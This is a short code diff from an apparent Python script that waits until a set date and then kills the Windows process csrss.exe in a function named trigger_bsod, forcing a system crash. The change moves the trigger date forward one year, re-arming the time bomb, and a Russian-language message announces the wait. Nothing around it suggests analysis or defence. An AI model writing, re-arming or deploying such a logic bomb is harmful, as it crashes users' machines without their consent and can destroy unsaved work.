@@ -48,7 +48,7 @@ def trigger_bsod():
     run_command("taskkill /f /im csrss.exe")
 
 def wait_until_target_time():
-    target_time = "2023-12-31 23:59:59"
+    target_time = "2024-12-31 23:59:59"
     print(f"Ожидаю время {target_time} для выполнения действий...")
     
     while True:
